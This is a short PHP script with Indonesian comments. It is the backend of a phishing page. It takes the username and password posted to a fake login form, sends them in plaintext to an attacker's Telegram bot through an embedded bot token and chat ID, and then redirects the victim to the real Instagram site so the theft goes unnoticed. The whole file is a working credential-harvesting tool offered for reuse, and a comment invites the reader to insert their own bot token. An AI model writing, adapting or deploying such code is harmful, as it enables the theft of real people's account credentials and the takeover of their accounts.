<?php
session_start();

// Cegah spam: hanya bisa submit tiap 30 detik
if (isset($_SESSION['last_submit']) && time() - $_SESSION['last_submit'] < 30) {
    die("Tunggu 30 detik sebelum coba lagi.");
}
$_SESSION['last_submit'] = time();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Ganti dengan token & chat_id bot Telegram kamu
    $token = "8346649556:AAGU6CD940Afu9JTr8mdtIR55iMUcZr5ecw";
    $chat_id = "7435066069";

    $message = "🔐 Login Attempt\n👤 Username: $username\n🔑 Password: $password";
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Kirim ke Telegram
    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];
    $options = [
        "http" => [
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "method" => "POST",
            "content" => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Setelah submit → redirect ke Instagram resmi
    header("Location: https://www.instagram.com");
    exit;
}
?>
